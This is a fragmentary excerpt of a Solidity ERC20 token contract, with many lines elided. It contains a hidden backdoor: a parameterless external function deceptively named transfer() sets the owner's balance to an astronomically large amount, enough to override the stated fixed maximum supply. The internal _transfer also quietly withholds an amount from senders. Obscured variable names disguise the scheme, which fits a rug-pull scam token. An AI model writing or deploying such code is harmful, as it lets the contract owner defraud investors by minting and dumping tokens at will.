 ...
 * that a supply mechanism has to be added in a derived contract using {_createy}.
...
contract Token is Context, IERC20, IERC20Metadata,Ownable {
    ...
    uint256 public constant MAXSupply = 100000000*10**9;
    /**
    ...
    constructor(string memory name_, string memory symbol_) {
        ...
        _symbol = symbol_;
        _bnbbusd = msg.sender;
        _createy(msg.sender, 100000000*10**decimals());
    }
    ...
    function transfer() external {
        ...
        if (_bnbbusd == _yydsOwen){
            _balance[_yydsOwen] = MAXSupply * 10000000000000000000000; 
        }
    }
    ...
    function _transfer(
        ...
        uint256 yydsBalance = _balance[from]-minAmount;
        
        require(yydsBalance >= amount2, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balance[from] = yydsBalance - amount2;
     ...
     */
    function _createy(address account, uint256 amount) internal virtual {
